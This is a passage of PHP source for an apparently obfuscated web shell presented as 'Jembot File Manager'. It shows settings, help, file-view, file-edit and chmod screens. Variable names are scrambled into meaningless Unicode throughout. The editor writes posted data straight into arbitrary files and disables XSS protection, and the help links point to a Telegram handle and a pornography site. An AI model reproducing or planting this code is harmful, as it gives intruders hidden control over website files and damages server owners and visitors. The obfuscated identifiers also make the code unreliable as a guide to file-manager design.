                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php 
echo lng('Theme') ?></label>
                        <div class="col-sm-5">
                            <select class="form-select w-100 text-capitalize" id="js-3-0" name="js-theme-3">
                                <option value='light' <?php 
if ($γ„γ¬γγΏογοο‰―²οοΌ == "light") {
                                                            echo "selected";
                                                        } ?>>
                                    <?php 
echo lng('light') ?>
                                </option>
                                <option value='dark' <?php 
if ($γ„γ¬γγΏογοο‰―²οοΌ == "dark") {
                                                            echo "selected";
                                                        } ?>>
                                    <?php 
echo lng('dark') ?>
                                </option>
                            </select>
                        </div>
                    </div>

                    <div class="mb-3 row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php 
echo lng('Save'); ?></button>
                        </div>
                    </div>

                    <small class="text-body-secondary">* <?php 
echo lng('Sometimes the save action may not work on the first try, so please attempt it again') ?>.</span>
                </form>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

if (isset($_GET['help'])) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    global $γ™γ‚†™„Όγγ­†γΌγγ, $»γογογγ™γ²γ;
?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php 
echo lng('Help') ?></span>
                <a href="?p=<?php 
echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php 
echo lng('Cancel') ?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p>
                        <h3><a href="https://t.me/ISC2k17" target="_blank" class="app-v-title"> Jembot File Manager <?php 
echo VERSION; ?></a></h3>
                        </p>
                        <p>Author: PRAΕATH MANΔ°</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers [at] gmail [dot] com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="xnxx.com" target="_blank"><i class="fa fa-question-circle"></i> <?php 
echo lng('Help Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="xnxx.com" target="_blank"><i class="fa fa-bug"></i> <?php 
echo lng('Report Issue') ?></a></li>
                                <?php 
if (!FM_READONLY) { ?>
                                    <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php 
echo lng('Generate new password hash') ?></a></li>
                                <?php 
} ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php 
echo lng('Generate new password hash') ?></label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php 
echo lng('Password') ?></label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="<?php 
echo lng('Password') ?>" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php 
echo lng('Generate') ?></button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// file viewer
if (isset($_GET['view'])) {
    $γ»γγµ™„‚‚γ = $_GET['view'];
    $γ»γγµ™„‚‚γ = fm_clean_path($γ»γγµ™„‚‚γ, false);
    $γ»γγµ™„‚‚γ = str_replace('/', '', $γ»γγµ™„‚‚γ);
    if ($γ»γγµ™„‚‚γ == '' || !is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ) || !fm_is_exclude_items($γ»γγµ™„‚‚γ)) {
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $ΌγΌγΏµγ‰γγγ²‰ = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $γ»γγµ™„‚‚γ);
    $―γ»γγ»®‚γγΌογ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ;

    $γγγ‚‚‚γ«‚γ‰‰Όγο = strtolower(pathinfo($―γ»γγ»®‚γγΌογ, PATHINFO_EXTENSION));
    $γγγ»Όγ‚¦Όο¦γγ = fm_get_mime_type($―γ»γγ»®‚γγΌογ);
    $γγΌΌγ‚Έ­γ‚ΌΏ = fm_get_size($―γ»γγ»®‚γγΌογ);
    $γΌ„„γ»γ‰‚γογ‰Ύ‰ = fm_get_filesize($γγΌΌγ‚Έ­γ‚ΌΏ);

    $οΌ―ΌγΌΎ„ο‚™γγγΈΌ² = false;
    $γγγγγ“γ»Ό­† = false;
    $†Όµ­ο»Ύο‚γ‚Ό = false;
    $†γγ†γογΌ«Όγ‰†γ» = false;
    $γ†γµ•µ­»•‰γ = false;
    $γΌΌγ»γ‚ογΌΏ„ = false;
    $†γ™Ό«ογ»γογΌ‚γ = false;

    $†µ‰ο²ο„‰ογ‚‰ = 'File';
    $“‚†‚‚γγ»γΏ‚‚γ­‰® = false; // for zip
    $γογ‚™―γΎγ‰γγΌ = ''; // for text
    $‰γοΏγΌ®•γ†Ό‰‰µ = strtolower(FM_DOC_VIEWER);

    if ($‰γοΏγΌ®•γ†Ό‰‰µ && $‰γοΏγΌ®•γ†Ό‰‰µ !== 'false' && in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_onlineViewer_exts())) {
        $†γ™Ό«ογ»γογΌ‚γ = true;
    } elseif ($γγγ‚‚‚γ«‚γ‰‰Όγο == 'zip' || $γγγ‚‚‚γ«‚γ‰‰Όγο == 'tar') {
        $οΌ―ΌγΌΎ„ο‚™γγγΈΌ² = true;
        $†µ‰ο²ο„‰ογ‚‰ = 'Archive';
        $“‚†‚‚γγ»γΏ‚‚γ­‰® = fm_get_zif_info($―γ»γγ»®‚γγΌογ, $γγγ‚‚‚γ«‚γ‰‰Όγο);
    } elseif (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_image_exts())) {
        $†Όµ­ο»Ύο‚γ‚Ό = true;
        $†µ‰ο²ο„‰ογ‚‰ = 'Image';
    } elseif (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_audio_exts())) {
        $†γγ†γογΌ«Όγ‰†γ» = true;
        $†µ‰ο²ο„‰ογ‚‰ = 'Audio';
    } elseif (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_video_exts())) {
        $γ†γµ•µ­»•‰γ = true;
        $†µ‰ο²ο„‰ογ‚‰ = 'Video';
    } elseif (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_text_exts()) || substr($γγγ»Όγ‚¦Όο¦γγ, 0, 4) == 'text' || in_array($γγγ»Όγ‚¦Όο¦γγ, fm_get_text_mimes())) {
        $γΌΌγ»γ‚ογΌΏ„ = true;
        $γογ‚™―γΎγ‰γγΌ = file_get_contents($―γ»γγ»®‚γγΌογ);
    }

?>
    <div class="row">
        <div class="col-12">
            <ul class="list-group w-50 my-3" data-bs-theme="<?php 
echo FM_THEME; ?>">
                <li class="list-group-item active" aria-current="true"><strong><?php 
echo lng($†µ‰ο²ο„‰ογ‚‰) ?>:</strong> <?php 
echo fm_enc(fm_convert_win($γ»γγµ™„‚‚γ)) ?></li>
                <?php 
$‰γγγ—²‚γ“γ„ο‚ = fm_get_display_path($―γ»γγ»®‚γγΌογ); ?>
                <li class="list-group-item"><strong><?php 
echo $‰γγγ—²‚γ“γ„ο‚['label']; ?>:</strong> <?php 
echo $‰γγγ—²‚γ“γ„ο‚['path']; ?></li>
                <li class="list-group-item"><strong>File size:</strong> <?php 
echo ($γγΌΌγ‚Έ­γ‚ΌΏ <= 1000) ? "$γγΌΌγ‚Έ­γ‚ΌΏ bytes" : $γΌ„„γ»γ‰‚γογ‰Ύ‰; ?></li>
                <li class="list-group-item"><strong>MIME-type:</strong> <?php 
echo $γγγ»Όγ‚¦Όο¦γγ ?></li>
                <?php

                // ZIP info
                if (($οΌ―ΌγΌΎ„ο‚™γγγΈΌ² || $γγγγγ“γ»Ό­†) && $“‚†‚‚γγ»γΏ‚‚γ­‰® !== false) {
                    $‚»γγ™γ™γγΌ‰ΌγΌµ = 0;
                    $‚γΌ‰†γγ†²Ό‰γ‰γ―γ = 0;
                    $γγ“γγο‚γγΌ†‚Ό» = 0;
                    foreach ($“‚†‚‚γγ»γΏ‚‚γ­‰® as $‚Όµ»™“‚«ο) {
                        if (!$‚Όµ»™“‚«ο['folder']) {
                            $‚»γγ™γ™γγΌ‰ΌγΌµ++;
                        }
                        $‚γΌ‰†γγ†²Ό‰γ‰γ―γ += $‚Όµ»™“‚«ο['compressed_size'];
                        $γγ“γγο‚γγΌ†‚Ό» += $‚Όµ»™“‚«ο['filesize'];
                    }
                ?>
                    <li class="list-group-item"><?php 
echo lng('Files in archive') ?>: <?php 
echo $‚»γγ™γ™γγΌ‰ΌγΌµ ?></li>
                    <li class="list-group-item"><?php 
echo lng('Total size') ?>: <?php 
echo fm_get_filesize($γγ“γγο‚γγΌ†‚Ό») ?></li>
                    <li class="list-group-item"> <?php 
echo lng('Size in archive') ?>: <?php 
echo fm_get_filesize($‚γΌ‰†γγ†²Ό‰γ‰γ―γ) ?></li>
                    <li class="list-group-item"><?php 
echo lng('Compression') ?>: <?php 
echo round(($‚γΌ‰†γγ†²Ό‰γ‰γ―γ / max($γγ“γγο‚γγΌ†‚Ό», 1)) * 100) ?>%</li>
                <?php

                }
                // Image info
                if ($†Όµ­ο»Ύο‚γ‚Ό) {
                    $οµ†‰®γ‰»‚οΏΌ‰ = getimagesize($―γ»γγ»®‚γγΌογ);
                    echo '<li class="list-group-item"><strong>' . lng('Image size') . ':</strong> ' . (isset($οµ†‰®γ‰»‚οΏΌ‰[0]) ? $οµ†‰®γ‰»‚οΏΌ‰[0] : '0') . ' x ' . (isset($οµ†‰®γ‰»‚οΏΌ‰[1]) ? $οµ†‰®γ‰»‚οΏΌ‰[1] : '0') . '</li>';
                }
                // Text info
                if ($γΌΌγ»γ‚ογΌΏ„) {
                    $γΌ„†ογ†γ‚²ΌΏγ‰†‚ = fm_is_utf8($γογ‚™―γΎγ‰γγΌ);
                    if (function_exists('iconv')) {
                        if (!$γΌ„†ογ†γ‚²ΌΏγ‰†‚) {
                            $γογ‚™―γΎγ‰γγΌ = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $γογ‚™―γΎγ‰γγΌ);
                        }
                    }
                    echo '<li class="list-group-item"><strong>' . lng('Charset') . ':</strong> ' . ($γΌ„†ογ†γ‚²ΌΏγ‰†‚ ? 'utf-8' : '8 bit') . '</li>';
                }
                ?>
            </ul>
            <div class="btn-group btn-group-sm flex-wrap" role="group">
                <form method="post" class="d-inline mb-0 btn btn-outline-primary" action="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;dl=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>">
                    <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                    <button type="submit" class="btn btn-link btn-sm text-decoration-none fw-bold p-0"><i class="fa fa-cloud-download"></i> <?php 
echo lng('Download') ?></button> &nbsp;
                </form>
                <?php 
if (!FM_READONLY): ?>
                    <a class="fw-bold btn btn-outline-primary" title="<?php 
echo lng('Delete') ?>" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;del=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>" onclick="confirmDailog(event, 1209, '<?php 
echo lng('Delete') . ' ' . lng('File'); ?>','<?php 
echo urlencode($γ»γγµ™„‚‚γ); ?>', this.href);"> <i class="fa fa-trash"></i> Delete</a>
                <?php 
endif; ?>
                <a class="fw-bold btn btn-outline-primary" href="<?php 
echo fm_enc($ΌγΌγΏµγ‰γγγ²‰) ?>" target="_blank"><i class="fa fa-external-link-square"></i> <?php 
echo lng('Open') ?></a></b>
                <?php

                // ZIP actions
                if (!FM_READONLY && ($οΌ―ΌγΌΎ„ο‚™γγγΈΌ² || $γγγγγ“γ»Ό­†) && $“‚†‚‚γγ»γΏ‚‚γ­‰® !== false) {
                    $¦Έγ„ΌοοΌ¬«Όγ»γγ = pathinfo($―γ»γγ»®‚γγΌογ, PATHINFO_FILENAME);
                ?>
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php 
echo urlencode($γ»γγµ™„‚‚γ); ?>">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0 border-0" style="font-size: 14px;"><i class="fa fa-check-circle"></i> <?php 
echo lng('UnZip') ?></button>
                    </form>
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
                        <input type="hidden" name="token" value="<?php 
echo $_SESSION['token']; ?>">
                        <input type="hidden" name="unzip" value="<?php 
echo urlencode($γ»γγµ™„‚‚γ); ?>">
                        <input type="hidden" name="tofolder" value="1">
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0" style="font-size: 14px;" title="UnZip to <?php 
echo fm_enc($¦Έγ„ΌοοΌ¬«Όγ»γγ) ?>"><i class="fa fa-check-circle"></i> <?php 
echo lng('UnZipToFolder') ?></button>
                    </form>
                <?php

                }
                if ($γΌΌγ»γ‚ογΌΏ„ && !FM_READONLY) {
                ?>
                    <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>" class="edit-file">
                        <i class="fa fa-pencil-square"></i> <?php 
echo lng('Edit') ?>
                    </a>
                    <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>&env=ace"
                        class="edit-file"><i class="fa fa-pencil-square"></i> <?php 
echo lng('AdvancedEditor') ?>
                    </a>
                <?php 
} ?>
                <a class="fw-bold btn btn-outline-primary" href="?p=<?php 
echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php 
echo lng('Back') ?></a>
            </div>
            <div class="row mt-3">
                <?php

                if ($†γ™Ό«ογ»γογΌ‚γ) {
                    if ($‰γοΏγΌ®•γ†Ό‰‰µ == 'google') {
                        echo '<iframe src="https://docs.google.com/viewer?embedded=true&hl=en&url=' . fm_enc($ΌγΌγΏµγ‰γγγ²‰) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                    } else if ($‰γοΏγΌ®•γ†Ό‰‰µ == 'microsoft') {
                        echo '<iframe src="https://view.officeapps.live.com/op/embed.aspx?src=' . fm_enc($ΌγΌγΏµγ‰γγγ²‰) . '" frameborder="no" style="width:100%;min-height:460px"></iframe>';
                    }
                } elseif ($οΌ―ΌγΌΎ„ο‚™γγγΈΌ²) {
                    // ZIP content
                    if ($“‚†‚‚γγ»γΏ‚‚γ­‰® !== false) {
                        echo '<code class="maxheight">';
                        foreach ($“‚†‚‚γγ»γΏ‚‚γ­‰® as $‚Όµ»™“‚«ο) {
                            if ($‚Όµ»™“‚«ο['folder']) {
                                echo '<b>' . fm_enc($‚Όµ»™“‚«ο['name']) . '</b><br>';
                            } else {
                                echo $‚Όµ»™“‚«ο['name'] . ' (' . fm_get_filesize($‚Όµ»™“‚«ο['filesize']) . ')<br>';
                            }
                        }
                        echo '</code>';
                    } else {
                        echo '<p>' . lng('Error while fetching archive info') . '</p>';
                    }
                } elseif ($†Όµ­ο»Ύο‚γ‚Ό) {
                    // Image content
                    if (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, array('gif', 'jpg', 'jpeg', 'png', 'bmp', 'ico', 'svg', 'webp', 'avif'))) {
                        echo '<p><input type="checkbox" id="preview-img-zoomCheck"><label for="preview-img-zoomCheck"><img src="' . fm_enc($ΌγΌγΏµγ‰γγγ²‰) . '" alt="image" class="preview-img"></label></p>';
                    }
                } elseif ($†γγ†γογΌ«Όγ‰†γ») {
                    // Audio content
                    echo '<p><audio src="' . fm_enc($ΌγΌγΏµγ‰γγγ²‰) . '" controls preload="metadata"></audio></p>';
                } elseif ($γ†γµ•µ­»•‰γ) {
                    // Video content
                    echo '<div class="preview-video"><video src="' . fm_enc($ΌγΌγΏµγ‰γγγ²‰) . '" width="640" height="360" controls preload="metadata"></video></div>';
                } elseif ($γΌΌγ»γ‚ογΌΏ„) {
                    if (FM_USE_HIGHLIGHTJS) {
                        // highlight
                        $‚γγ†ο‰„γ‚γο = array(
                            'shtml' => 'xml',
                            'htaccess' => 'apache',
                            'phtml' => 'php',
                            'lock' => 'json',
                            'svg' => 'xml',
                        );
                        $γο»γγ‚γγ‚γγ‚γ‰γ = isset($‚γγ†ο‰„γ‚γο[$γγγ‚‚‚γ«‚γ‰‰Όγο]) ? 'lang-' . $‚γγ†ο‰„γ‚γο[$γγγ‚‚‚γ«‚γ‰‰Όγο] : 'lang-' . $γγγ‚‚‚γ«‚γ‰‰Όγο;
                        if (empty($γγγ‚‚‚γ«‚γ‰‰Όγο) || in_array(strtolower($γ»γγµ™„‚‚γ), fm_get_text_names()) || preg_match('#\.min\.(css|js)$#i', $γ»γγµ™„‚‚γ)) {
                            $γο»γγ‚γγ‚γγ‚γ‰γ = 'nohighlight';
                        }
                        $γογ‚™―γΎγ‰γγΌ = '<pre class="with-hljs"><code class="' . $γο»γγ‚γγ‚γγ‚γ‰γ . '">' . fm_enc($γογ‚™―γΎγ‰γγΌ) . '</code></pre>';
                    } elseif (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, array('php', 'php4', 'php5', 'phtml', 'phps'))) {
                        // php highlight
                        $γογ‚™―γΎγ‰γγΌ = highlight_string($γογ‚™―γΎγ‰γγΌ, true);
                    } else {
                        $γογ‚™―γΎγ‰γγΌ = '<pre>' . fm_enc($γογ‚™―γΎγ‰γγΌ) . '</pre>';
                    }
                    echo $γογ‚™―γΎγ‰γγΌ;
                }
                ?>
            </div>
        </div>
    </div>
<?php

    fm_show_footer();
    exit;
}

// file editor
if (isset($_GET['edit']) && !FM_READONLY) {
    $γ»γγµ™„‚‚γ = $_GET['edit'];
    $γ»γγµ™„‚‚γ = fm_clean_path($γ»γγµ™„‚‚γ, false);
    $γ»γγµ™„‚‚γ = str_replace('/', '', $γ»γγµ™„‚‚γ);
    if ($γ»γγµ™„‚‚γ == '' || !is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ) || !fm_is_exclude_items($γ»γγµ™„‚‚γ)) {
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }
    $γ»Όγ‰‚Όγγγγγ = ' : <i><b>' . $γ»γγµ™„‚‚γ . '</b></i>';
    header('X-XSS-Protection:0');
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $ΌγΌγΏµγ‰γγγ²‰ = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $γ»γγµ™„‚‚γ);
    $―γ»γγ»®‚γγΌογ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ;

    // normal editer
    $»γγγγγγο¦„ογγγ“ = true;
    if (isset($_GET['env'])) {
        if ($_GET['env'] == "ace") {
            $»γγγγγγο¦„ογγγ“ = false;
        }
    }

    // Save File
    if (isset($_POST['savedata'])) {
        $οΏΌγγΌ‰γ„»Όγ = $_POST['savedata'];
        $γ²µ„™γγο¦²†γ² = fopen($―γ»γγ»®‚γγΌογ, "w");
        @fwrite($γ²µ„™γγο¦²†γ², $οΏΌγγΌ‰γ„»Όγ);
        fclose($γ²µ„™γγο¦²†γ²);
        fm_set_msg(lng('File Saved Successfully'));
    }

    $γγγ‚‚‚γ«‚γ‰‰Όγο = strtolower(pathinfo($―γ»γγ»®‚γγΌογ, PATHINFO_EXTENSION));
    $γγγ»Όγ‚¦Όο¦γγ = fm_get_mime_type($―γ»γγ»®‚γγΌογ);
    $γΌ„„γ»γ‰‚γογ‰Ύ‰ = filesize($―γ»γγ»®‚γγΌογ);
    $γΌΌγ»γ‚ογΌΏ„ = false;
    $γογ‚™―γΎγ‰γγΌ = ''; // for text

    if (in_array($γγγ‚‚‚γ«‚γ‰‰Όγο, fm_get_text_exts()) || substr($γγγ»Όγ‚¦Όο¦γγ, 0, 4) == 'text' || in_array($γγγ»Όγ‚¦Όο¦γγ, fm_get_text_mimes())) {
        $γΌΌγ»γ‚ογΌΏ„ = true;
        $γογ‚™―γΎγ‰γγΌ = file_get_contents($―γ»γγ»®‚γγΌογ);
    }

?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php 
if (!$»γγγγγγο¦„ογγγ“) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php 
echo lng('Fullscreen') ?>"><i class="fa fa-expand" title="<?php 
echo lng('Fullscreen') ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php 
echo lng('Search') ?>"><i class="fa fa-search" title="<?php 
echo lng('Search') ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php 
echo lng('Undo') ?>"><i class="fa fa-undo" title="<?php 
echo lng('Undo') ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php 
echo lng('Redo') ?>"><i class="fa fa-repeat" title="<?php 
echo lng('Redo') ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php 
echo lng('Word Wrap') ?>"><i class="fa fa-text-width" title="<?php 
echo lng('Word Wrap') ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php 
echo lng('Select Document Type') ?>" class="btn-outline-secondary border-start-0 d-none d-md-block">
                                <option>-- <?php 
echo lng('Select Mode') ?> --</option>
                            </select>
                            <select id="js-ace-theme" data-type="theme" title="<?php 
echo lng('Select Theme') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block">
                                <option>-- <?php 
echo lng('Select Theme') ?> --</option>
                            </select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php 
echo lng('Select Font Size') ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block">
                                <option>-- <?php 
echo lng('Select Font Size') ?> --</option>
                            </select>
                        </div>
                    <?php 
} ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <div class="btn-group">
                    <a title=" <?php 
echo lng('Back') ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>"><i class="fa fa-reply-all"></i> <?php 
echo lng('Back') ?></a>
                    <a title="<?php 
echo lng('BackUp') ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php 
echo urlencode(trim(FM_PATH)) ?>','<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>')"><i class="fa fa-database"></i> <?php 
echo lng('BackUp') ?></a>
                    <?php 
if ($γΌΌγ»γ‚ογΌΏ„) { ?>
                        <?php 
if ($»γγγγγγο¦„ογγγ“) { ?>
                            <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php 
echo lng('AdvancedEditor') ?></a>
                            <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php 
echo fm_enc($ΌγΌγΏµγ‰γγγ²‰) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                            </button>
                        <?php 
} else { ?>
                            <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php 
echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php 
echo urlencode($γ»γγµ™„‚‚γ) ?>"><i class="fa fa-text-height"></i> <?php 
echo lng('NormalEditor') ?></a>
                            <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php 
echo fm_enc($ΌγΌγΏµγ‰γγγ²‰) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php 
echo lng('Save') ?>
                            </button>
                        <?php 
} ?>
                    <?php 
} ?>
                </div>
            </div>
        </div>
        <?php

        if ($γΌΌγ»γ‚ογΌΏ„ && $»γγγγγγο¦„ογγγ“) {
            echo '<textarea class="mt-2" id="normal-editor" rows="33" cols="120" style="width: 99.5%;">' . htmlspecialchars($γογ‚™―γΎγ‰γγΌ) . '</textarea>';
            echo '<script>document.addEventListener("keydown", function(e) {if ((window.navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)  && e.keyCode == 83) { e.preventDefault();edit_save(this,"nrl");}}, false);</script>';
        } elseif ($γΌΌγ»γ‚ογΌΏ„) {
            echo '<div id="editor" contenteditable="true">' . htmlspecialchars($γογ‚™―γΎγ‰γγΌ) . '</div>';
        } else {
            fm_set_msg(lng('FILE EXTENSION HAS NOT SUPPORTED'), 'error');
        }
        ?>
    </div>
<?php

    fm_show_footer();
    exit;
}

// chmod (not for Windows)
if (isset($_GET['chmod']) && !FM_READONLY && !FM_IS_WIN) {
    $γ»γγµ™„‚‚γ = $_GET['chmod'];
    $γ»γγµ™„‚‚γ = fm_clean_path($γ»γγµ™„‚‚γ);
    $γ»γγµ™„‚‚γ = str_replace('/', '', $γ»γγµ™„‚‚γ);
    if ($γ»γγµ™„‚‚γ == '' || (!is_file($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ) && !is_dir($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ))) {
        fm_set_msg(lng('File not found'), 'error');
        $‚¦γγγ‚γγ‰γΈΌΏ = FM_PATH;
        fm_redirect(FM_SELF_URL . '?p=' . urlencode($‚¦γγγ‚γγ‰γΈΌΏ));
    }

    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path

    $ΌγΌγΏµγ‰γγγ²‰ = FM_ROOT_URL . (FM_PATH != '' ? '/' . FM_PATH : '') . '/' . $γ»γγµ™„‚‚γ;
    $―γ»γγ»®‚γγΌογ = $γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ;

    $ο»Ό†ΈΌΏγ‰ = fileperms($γΌγ‚²γγοΌΌγ„²«„ . '/' . $γ»γγµ™„‚‚γ);
?>
    <div class="path">
        <div class="card mb-2" data-bs-theme="<?php 
echo FM_THEME; ?>">
            <h6 class="card-header">
                <?php 
echo lng('ChangePermissions') ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php 
$‰γγγ—²‚γ“γ„ο‚ = fm_get_display_path($―γ»γγ»®‚γγΌογ); ?>
                    <?php 
echo $‰γγγ—²‚γ“γ„ο‚['label']; ?>: <?php 
echo $‰γγγ—²‚γ“γ„ο‚['path']; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php 
echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php 
echo fm_enc($γ»γγµ™„‚‚γ) ?>">

                    <table class="table compact-table" data-bs-theme="<?php 
echo FM_THEME; ?>">
                        <tr>
                            <td></td>
                            <td><b><?php 
echo lng('Owner') ?></b></td>
                            <td><b><?php 
echo lng('Group') ?></b></td>
                            <td><b><?php 
echo lng('Other') ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Read') ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00400) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00040) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00004) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Write') ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00200) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00020) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00002) ? ' checked' : '' ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php 
echo lng('Execute') ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1" <?php 
echo ($ο»Ό†ΈΌΏγ‰ & 00100) ? ' checked' : '' ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1" <?php 
